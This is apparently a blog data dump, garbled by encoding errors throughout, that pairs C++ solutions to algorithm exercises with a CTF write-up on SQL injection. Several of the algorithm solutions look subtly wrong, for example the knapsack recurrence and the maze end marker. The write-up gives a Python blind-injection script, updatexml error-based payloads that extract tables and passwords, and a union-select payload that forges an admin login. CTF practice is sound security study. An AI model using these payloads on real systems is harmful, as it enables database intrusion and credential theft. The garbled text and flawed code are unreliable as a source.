å¸®å­™ç­–è°‹ä¸€ä¸ªç­–ç•¥ï¼Œä½¿å¾—æ›´å¤šçš„å°æœ‹å‹æœ‰æœºä¼šå‡ºæµ·èˆªè¡Œã€‚å·²çŸ¥çš„æ¡ä»¶æ˜¯å­™ç­–èˆ¹çš„æœ€å¤§è½½é‡mï¼Œä»¥åŠnä¸ªå°æœ‹å‹çš„ä½“é‡ã€‚ è¾“å…¥å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=1000ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚ æ¯ç»„æµ‹è¯•ç”¨ä¾‹ç¬¬ä¸€è¡Œæœ‰ä¸¤ä¸ªæ•´æ•°må’Œnã€‚ï¼ˆ0&lt;=m&lt;=1000ï¼Œ 0&lt;=n&lt;=1000ï¼‰ï¼Œåˆ†åˆ«ä»£è¡¨èˆ¹çš„è½½é‡é‡é‡å’Œå°æœ‹å‹çš„ä¸ªæ•°ï¼Œæ¥ä¸‹æ¥ä¸€è¡Œä¸ºnä¸ªå°æœ‹å‹çš„ä½“é‡ã€‚ è¾“å‡ºæ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨æœ€å¤šèƒ½æœ‰ansä¸ªå°æœ‹å‹è·Ÿç€ä¸€èµ·å‡ºæµ·ã€‚ æ ·ä¾‹è¾“å…¥2 10 4 3 5 2 4 20 9 3 5 2 4 6 1 8 5 9 æ ·ä¾‹è¾“å‡º3 6 æç¤ºå°±æ˜¯ç®€å•çš„è£…åœ¨é—®é¢˜ #include&lt;bits/stdc++.h&gt; using namespace std; int T,m,n; int w[1005]; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int ans=0; cin&gt;&gt;m&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;w[i]; &#125; sort(w,w+n); for(int i=0;i&lt;n;i++) &#123; if(m&gt;=w[i]) &#123; ans++; m-=w[i]; &#125; else break; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0; &#125; é—®é¢˜ E: æå†°é˜²å¾¡â€”â€”ç›¾å±±é¢˜ç›®æè¿°ç›¾å±±æ˜¯ç‹è€…å³¡è°·é‡Œçš„è¾…åŠ©ï¼Œä¸€å¤«å½“å…³ã€ä¸‡å¤«è«å¼€ï¼Œä¸€ä¸ªå¥½çš„è¾…åŠ©å¾€å¾€å¯ä»¥ç»™å›¢é˜Ÿå¸¦æ¥æå¤§å¸®åŠ©ã€‚ ç›¾å±±çš„æ¸¸æˆä¸­çš„ä¸€ä¸ªæŠ€èƒ½ä¸ºä¸åŠ¨å¦‚å±±ï¼šæ‰‹æ¡ä¸€å—ç”±çŸ³å¤´ç»„æˆçš„å·¨ç›¾ï¼Œå¼ å¼€å·¨ç›¾ç ¸å‘åœ°é¢ï¼Œå°†æ•Œäººæ¨å¼€ï¼Œå¹¶æŒç»­ä¸€æ®µæ—¶é—´ã€‚ å‡è®¾ç›¾å±±æœ€å¤šåªèƒ½æ‰¿å—Cé‡é‡çš„ç›¾ç‰Œï¼Œè€Œç°åœ¨æœ‰Nä¸ªå°çŸ³å¤´ï¼Œæ¯ä¸ªçŸ³å¤´içš„é‡é‡ä¸ºWiï¼Œé˜²å¾¡å€¼ä¸ºPiã€‚é‚£ä¹ˆï¼Œå‘†èŒçš„ç›¾å±±æƒ³çŸ¥é“ï¼Œä»–ä»Nä¸ªå°çŸ³å¤´ä¸­æŒ‘é€‰Mä¸ªï¼ˆM&lt;=Nï¼‰ç»„æˆä»–å¯æ‰¿å—ç›¾ç‰Œï¼Œæœ€å¤§çš„é˜²å¾¡å€¼æ˜¯å¤šå°‘ï¼Ÿ è¾“å…¥å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=10ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚ æ¥ä¸‹æ¥æœ‰Tç»„æµ‹è¯•ç”¨ä¾‹ã€‚æ¯ç»„æµ‹è¯•ç”¨ä¾‹ç¬¬ä¸€è¡Œä¸ºç›¾å±±æ‰¿å—ç›¾ç‰Œçš„æœ€å¤§é‡é‡C(C&lt;10000)å’Œå°çŸ³å¤´çš„ä¸ªæ•°N(N&lt;1000)ã€‚æ¥ä¸‹æ¥çš„Nè¡Œåˆ†åˆ«ä¸ºå°çŸ³å¤´çš„é‡é‡Wi(1&lt;=Wi&lt;=100)å’Œé˜²å¾¡å€¼Pi(1&lt;=Pi&lt;=3000000)ã€‚ è¾“å‡ºæ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨å¯æ‰¿å—ç›¾ç‰Œçš„æœ€å¤§é˜²å¾¡å€¼ã€‚ æ ·ä¾‹è¾“å…¥1 10 5 2 6 2 3 6 5 5 4 4 6 æ ·ä¾‹è¾“å‡º15 æç¤º01èƒŒåŒ…é—®é¢˜ï¼Œä¸çŸ¥é“ä¸‹é¢çš„è§£èƒ½ä¸èƒ½è¿‡ #include&lt;bits/stdc++.h&gt; using namespace std; const int N=1e5+5; long long ans[N]; int w[N],v[N]; int T; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int C,N; memset(ans,0,sizeof(ans)); cin&gt;&gt;C&gt;&gt;N; for(int i=0;i&lt;N;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; for(int i=0;i&lt;N;i++) &#123; for(int j=C;j&gt;=w[i];j--) ans[j]=max(ans[j-1],ans[j-w[i]]+v[i]); &#125; // for(int i=0;i&lt;=C;i++) // cout&lt;&lt;ans[i]&lt;&lt;endl; cout&lt;&lt;ans[C]&lt;&lt;endl; &#125; return 0; &#125; ps:ä»¥ä¸Šä»£ç æ²¡æœ‰æäº¤æµ‹è¯•ç¯å¢ƒï¼Œåªæ˜¯è¿‡äº†ç»™å‡ºçš„æµ‹è¯•æ ·ä¾‹ã€‚ dfså¤§åˆé›†è¿·å®«é—®é¢˜é¢˜ç›®æè¿°å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚ è¾“å…¥ è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼šâ€˜Sâ€™ï¼šèµ·ç‚¹â€˜Eâ€™ï¼šç»ˆç‚¹â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚ è¾“å‡º å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚ æ ·ä¾‹è¾“å…¥1 5 5 s-### ----- ##--- E#--- ---## æ ·ä¾‹è¾“å‡º9 #include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//è®¡æ­¥æ•°ç»„ è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 char map[100][100]; //ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ typedef pair&lt;int,int&gt; P; //åæ ‡ int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘ int sx,ex,sy,ey; //(sx,sy)ä¸ºèµ·ç‚¹åæ ‡ ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡ int x,y,nx,ny; //(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡ ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ int r,l; //rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;P&gt; qu; qu.push(P(sx,sy)); //å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //å–å‡ºé˜Ÿå¤´åæ ‡ qu.pop() ;//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯ for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ° æ’é™¤èµ°è¿‡çš„è·¯ &#123; qu.push(P(nx,ny)); //å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ de[nx][ny]=de[x][y]+1; //æ­¥æ•°åŠ ä¸€ &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //è®°å½•èµ·ç‚¹åæ ‡ &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;T&#x27;) //è®°å½•ç»ˆç‚¹åæ ‡ &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125; acwingè¿·å®«é—®é¢˜#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int dis[N][N]; typedef pair&lt;int,int&gt; P; int n,m; int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; int x,y,nx,ny; void dfs() &#123; memset(dis,-1,sizeof(dis)); queue&lt;P&gt; qu; qu.push(P(0,0)); dis[0][0]=0; while(!qu.empty()) &#123; P p=qu.front(); qu.pop(); x=p.first,y=p.second; if(x==n-1&amp;&amp;y==m-1) break; for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i],ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==-1&amp;&amp;mp[nx][ny]==0) &#123; qu.push(P(nx,ny)); dis[nx][ny]=dis[x][y]+1; &#125; &#125; &#125; if(dis[n-1][m-1]!=-1) cout&lt;&lt;dis[n-1][m-1]; return; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;m; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;m;j++) cin&gt;&gt;mp[i][j]; dfs(); return 0; &#125; nçš‡åé—®é¢˜#include&lt;bits/stdc++.h&gt; using namespace std; int n,ans=0; const int N=20; char m[N][N]; bool col[N],dg[N],udg[N]; void dfs(int u) &#123; if(u==n) &#123; // for(int i=0;i&lt;n;i++) // cout&lt;&lt;m[i]&lt;&lt;endl; ans++; return; &#125; for(int i=0;i&lt;n;i++) &#123; if(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i]) &#123; m[u][i]=&#x27;Q&#x27;; col[i]=dg[i+u]=udg[n-u+i]=1; dfs(u+1); col[i]=dg[i+u]=udg[n-u+i]=0;//å›æº¯æ¢å¤ç°åœº m[u][i]=&#x27;.&#x27;; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++) m[i][j]=&#x27;.&#x27;; dfs(0); cout&lt;&lt;ans; return 0; &#125; må›¾ç€è‰²é—®é¢˜é¢˜ç›®æè¿°ç»™å®šæ— å‘è¿é€šå›¾Gå’Œmç§ä¸åŒçš„é¢œè‰²ï¼Œç”¨è¿™äº›é¢œè‰²ç»™å›¾çš„å„ä¸ªé¡¶ç‚¹ç€ä¸€ç§é¢œè‰²ï¼Œè‹¥æŸç§æ–¹æ¡ˆä½¿å¾—å›¾ä¸­æ¯æ¡è¾¹çš„2ä¸ªé¡¶ç‚¹çš„é¢œè‰²éƒ½ä¸ç›¸åŒï¼Œåˆ™æ˜¯ä¸€ä¸ªæ»¡è¶³çš„æ–¹æ¡ˆï¼Œæ‰¾å‡ºæ‰€æœ‰çš„æ–¹æ¡ˆã€‚ è¾“å…¥ç¬¬ä¸€è¡Œæœ‰3ä¸ªæ­£æ•´æ•°nï¼Œkå’Œmï¼Œåˆ†åˆ«è¡¨ç¤ºnä¸ªé¡¶ç‚¹ï¼Œkæ¡è¾¹ï¼Œmç§é¢œè‰²æ¥ä¸‹æ¥kè¡Œï¼Œæ¯è¡Œ2ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºä¸€æ¡è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹ è¾“å‡ºæ‰€æœ‰ä¸åŒçš„ç€è‰²æ–¹æ¡ˆæ•° æ ·ä¾‹è¾“å…¥5 8 4 1 2 1 3 1 4 2 3 2 4 2 5 3 4 4 5 æ ·ä¾‹è¾“å‡º48 æç¤º#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int color[N]=&#123;0&#125;; int n,k,m,ans=0; void dfs(int d) &#123; if(d==n+1) &#123; ans++; return; &#125; for(int i=1;i&lt;=m;i++) &#123; int flag=1; for(int j=1;j&lt;=n;j++) &#123; if(mp[d][j]&amp;&amp;color[j]==i) &#123; flag=0; break; &#125; &#125; if(flag) &#123; color[d]=i; dfs(d+1); color[d]=0; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i=0;i&lt;k;i++) &#123; int t1,t2; cin&gt;&gt;t1&gt;&gt;t2; mp[t1][t2]=1; mp[t2][t1]=1; &#125; dfs(1); cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125; éƒ¨åˆ†å’Œé¢˜ç›®æè¿°ç»™å®šnä¸ªæ•´æ•°ï¼Œåˆ¤æ–­æ˜¯å¦å¯ä»¥ä»ä¸­é€‰æ‹©è‹¥å¹²æ•°å­—ï¼Œä½¿å¾—ä»–ä»¬çš„å’Œæ°å¥½ä¸ºkã€‚ è¾“å…¥å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚ å¯¹äºæ¯ç»„æµ‹è¯•ç”¨ä¾‹ï¼Œç¬¬ä¸€è¡Œä¸€ä¸ªæ­£æ•´æ•°nï¼Œç¬¬äºŒè¡Œnä¸ªæ•´æ•°ï¼Œç¬¬ä¸‰è¡Œä¸€ä¸ªæ•´æ•°kã€‚ 1*â‰¤Nâ‰¤*20ï¼Œè¾“å…¥æ•´æ•°åŠkå‡å°äº1e8ã€‚ è¾“å‡ºè‹¥å¯ä»¥ä½¿å¾—å’Œä¸ºkï¼Œè¾“å‡ºâ€Yesâ€,å¦åˆ™â€Noâ€ã€‚ æ ·ä¾‹è¾“å…¥4 1 2 4 7 13 æ ·ä¾‹è¾“å‡ºYes #include&lt;bits/stdc++.h&gt; using namespace std; int s[25]; int n,m; bool check(int l,int a) &#123; if(a==m) return true; if(l==n) return false; if(check(l+1,a+s[l])) return true; if(check(l+1,a)) return true; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; &#125; cin&gt;&gt;m; if(check(0,0)) cout&lt;&lt;&quot;YES&quot;; else cout&lt;&lt;&quot;NO&quot;; return 0; &#125;","tags":[]},{"title":"buuctf-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"buuctf-sqlæ³¨å…¥","date":"2020-10-05T10:29:30.000Z","path":"2020/10/05/buuoj/","text":"buuctfâ€“æ³¨å…¥ç¯‡ [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldç»™äº†æç¤ºï¼ŒAll You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39; çŒœæµ‹flagåœ¨flag è¡¨ä¸­ï¼ŒæŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯ select flag from flag ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œor,union,orderç­‰ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨ æ„é€ ç›²æ³¨è¯­å¥ id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2) ä¸¤æ¬¡çš„æç¤ºè¯­å¥ä¸ä¸€æ ·ï¼Œè¯´æ˜è¿™ä¸ªæ³¨å…¥è¯­å¥æ˜¯å¯¹çš„ï¼Œä¸”å½“æç¤ºHelloæ—¶åº”è¯¥æ˜¯å¯¹çš„ã€‚ // äºŒåˆ†æ³¨å…¥ import requests url = &quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot; data = &#123;id : &quot;&quot;&#125; flag = &quot;&quot; for i in range(50): left = 33 right = 128 mid = (right + left) &gt;&gt; 1 while(right&gt;left): data[&quot;id&quot;] = &quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;.format(i,mid) response = requests.post(url,data=data) if &quot;Hello&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLæŠ¥é”™æ³¨å…¥ æµ‹è¯•å‘ç°or,union,substr,ç©ºæ ¼,/**/ç­‰éƒ½è¢«åŠ å…¥é»‘åå•ï¼ŒåŒå†™ä¹Ÿæ— æ³•ç»•è¿‡ å¯æ˜¯ä½¿ç”¨æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥åŸç†ï¼š å…¶åŸå› ä¸»è¦æ˜¯å› ä¸ºè™šæ‹Ÿè¡¨çš„ä¸»é”®é‡å¤ã€‚æŒ‰ç…§MySQLçš„å®˜æ–¹è¯´æ³•ï¼Œgroup byè¦è¿›è¡Œä¸¤æ¬¡è¿ç®—ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ‹¿group byåé¢çš„å­—æ®µå€¼åˆ°è™šæ‹Ÿè¡¨ä¸­å»å¯¹æ¯”å‰ï¼Œé¦–å…ˆè·å–group byåé¢çš„å€¼ï¼›ç¬¬äºŒæ¬¡æ˜¯å‡è®¾group byåé¢çš„å­—æ®µçš„å€¼åœ¨è™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨ï¼Œé‚£å°±éœ€è¦æŠŠå®ƒæ’å…¥åˆ°è™šæ‹Ÿè¡¨ä¸­ï¼Œè¿™é‡Œåœ¨æ’å…¥æ—¶ä¼šè¿›è¡Œç¬¬äºŒæ¬¡è¿ç®—ï¼Œç”±äºrandå‡½æ•°å­˜åœ¨ä¸€å®šçš„éšæœºæ€§ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡è¿ç®—çš„ç»“æœå¯èƒ½ä¸ç¬¬ä¸€æ¬¡è¿ç®—çš„ç»“æœä¸ä¸€è‡´ï¼Œä½†æ˜¯è¿™ä¸ªè¿ç®—çš„ç»“æœå¯èƒ½åœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨äº†ï¼Œé‚£ä¹ˆè¿™æ—¶çš„æ’å…¥å¿…ç„¶å¯¼è‡´ä¸»é”®çš„é‡å¤ï¼Œè¿›è€Œå¼•å‘é”™è¯¯ã€‚ ç›¸å…³é“¾æ¥ https://www.cnblogs.com/richardlee97/p/10617115.html https://www.jianshu.com/p/d8ae3e8dabdc https://blog.csdn.net/qq_37873738/article/details/88042610 UPDATEXML (XML_document, XPath_string, new_value);ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDocç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23 è¿™é‡Œä¼šå‘ç°flagæ˜¾ç¤ºä¸å…¨ï¼Œå¯èƒ½æ˜¯æŠ¥é”™ç°å®çš„å­—æ•°é™åˆ¶ï¼Œåˆ©ç”¨right/leftå‡½æ•°ï¼Œæ˜¾ç¤ºéƒ¨åˆ†çš„flagï¼Œä¹‹åæ‹¼æ¥èµ·æ¥ æ˜¾ç¤ºåé¢çš„flag ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23 [ç½‘é¼æ¯ 2018]Fakebooksqlæ³¨å…¥+ååºåˆ—åŒ–+ä»£ç å®¡è®¡ [GXYCTF2019]BabySQliä¸‹è½½çš„æºç ï¼Œæœ‰åŠ©äºåé¢åšé¢˜ mysqli_query($con,&#x27;SET NAMES UTF8&#x27;); $name = $_POST[&#x27;name&#x27;]; $password = $_POST[&#x27;pw&#x27;]; $t_pw = md5($password); //å¯¹ä¼ å…¥çš„passwordå‚æ•°è¿›è¡Œäº†md5åŠ å¯† $sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;; // echo $sql; $result = mysqli_query($con, $sql); if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123; // è¿‡æ»¤äº†() | = or die(&quot;do not hack me!&quot;); &#125; else&#123; if (!$result) &#123; printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); exit(); &#125; else&#123; // echo &#x27;&lt;pre&gt;&#x27;; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == &quot;admin&quot;)&#123; if(md5($password) == $arr[2])&#123; // echo $flag; &#125; else&#123; die(&quot;wrong pass!&quot;); &#125; &#125; else&#123; die(&quot;wrong user!&quot;); &#125; &#125; &#125; éšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼ŒæŸ¥çœ‹æºç ï¼Œå‡ºç°æç¤º è¯•äº†è¯•åº”è¯¥æ˜¯base32ï¼Œè§£ç åæ˜¯base64 c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== ç»§ç»­è§£ç  select * from user where username = &#x27;$name&#x27; æ³¨å…¥ç‚¹æ˜¯nameå‚æ•°è¿™é‡Œï¼Œä¸ä¸Šé¢æºç ä¸­çš„æŸ¥è¯¢è¯­å¥ä¸€æ ·ã€‚ ç»è¿‡æµ‹è¯•å‘ç°æœ‰ä¸‰åˆ—ï¼Œname=admin&#39; union select 1,2,3 #&amp;pw=as#æ˜¾ç¤ºæ­£å¸¸ï¼Œname=admn&#39; union select 1,2,3,4#&amp;pw=asæŠ¥é”™ ä½†æ˜¯é¡µé¢æ²¡æœ‰æ•°å­—å›æ˜¾ï¼Œæ‰€ä»¥å¸¸è§„çš„æ³¨å…¥åº”è¯¥æ˜¯ä¸è¡Œçš„ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜å¯ä»¥çŸ¥é“usernameæ˜¯adminï¼Œ è¾“å…¥username=admin&amp;password=11,æ—¶æç¤ºwrong pass! è¾“å…¥username=admn&amp;password=11,æ—¶æç¤ºwrong user!ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­ç”¨æˆ·åä¸ºadmin æ¥ä¸‹æ¥ä»‹ç»ä¸€ç§æ–°çš„unionæ³¨å…¥ å…ˆå»ºç«‹ä¸€å¼ è¡¨ select * from test where id=0 union select 1,&#x27;admin&#x27;,&#x27;2322&#x27;; unionè¯­å¥åæŸ¥è¯¢çš„æ˜¯è¡¨ä¸­ä¸å­˜åœ¨çš„ä¸€ä¸ªæ•°æ®ï¼ŒæŸ¥è¯¢ç»“æœå¦‚ä¸‹ è¿™ä¸ªç»“æœè¯´æ˜ï¼ŒunionæŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œå…¶ä¸­æ”¾ç€æ‰€æŸ¥è¯¢åˆ°çš„æ•°æ®å’ŒunionååŒ…å«çš„æ•°æ® è¿™é‡Œå°±æ˜¯ id=1,username=admin,password=2322 è¿™æ ·å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ”¹å˜æ•°æ®åº“ä¸­ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åç”¨è‡ªå·±è®¾ç½®çš„å¯†ç ç™»å½• æ¥ä¸‹æ¥ï¼Œåˆ©ç”¨è¿™ç‚¹åšè¿™ä¸ªé¢˜ç›®ï¼Œé¦–å…ˆçŸ¥é“ä¸€å…±ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—åº”è¯¥æ˜¯idï¼ŒçŸ¥é“ä¹‹åä¸¤åˆ—çš„å†…å®¹å°±å¯ä»¥äº† name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11æç¤ºçš„wrong user! name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11æç¤ºçš„wrong pass! ç¬¬äºŒåˆ—çš„å­—æ®µååº”è¯¥å°±æ˜¯usernameï¼Œç¬¬ä¸‰åˆ—è‡ªç„¶å°±æ˜¯passwordï¼Œä½†æ˜¯è¿™é¢˜çš„passwordå­—æ®µå­˜æ”¾çš„æ—¶md5åŠ å¯†åçš„å†…å®¹ï¼ˆçœ‹åˆ°å¸ˆå‚…ä»¬çš„wpæ‰çŸ¥é“çš„ï¼Œçœ‹åˆ°æºç ä¹Ÿç¡®å®è¿™æ ·ï¼Œä½†æ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™è¿™ä¹ˆå‘ç°ä¸å¾—è€ŒçŸ¥ï¼‰ payload: name=000&#x27;union select 1,&#x27;admin&#x27;,&#x27;b59c67bf196a4758191e42f76670ceba&#x27;#&amp;pw=1111 b59c67bf196a4758191e42f76670cebaæ˜¯1111çš„md5å€¼ï¼Œpwçš„å€¼ä¸º1111 [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQLä¸hard sqlæ˜¯ä¸€ä¸ªç³»åˆ—çš„ï¼Œä½†æ˜¯è¿™ä¸ªåº”è¯¥æ˜¯ç›²æ³¨ åœ¨search.phpä¸­æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•å¯ä»¥å‘ç°æ˜¯æ•°å­—å‹æ³¨å…¥ 